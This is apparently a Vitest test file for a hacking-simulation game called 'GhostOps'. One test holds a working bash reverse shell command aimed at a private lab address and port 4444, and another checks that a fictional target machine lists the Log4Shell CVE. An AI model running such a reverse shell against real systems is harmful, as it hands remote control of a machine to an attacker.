import { describe, it, expect } from 'vitest';
import { INITIAL_MACHINES } from '../store/gameStore';

describe('GhostOps AI & Payloads', () => {
  it('contains valid reverse shell payloads formatted with target parameters', () => {
    const payload = 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1';
    expect(payload).toContain('/dev/tcp');
    expect(payload).toContain('4444');
  });

  it('matches target machines with appropriate CVE vectors', () => {
    const ecorp = INITIAL_MACHINES.find((m) => m.id === 'ecorp-hr');
    expect(ecorp?.cves.some((c) => c.includes('CVE-2021-44228'))).toBe(true);
  });
});
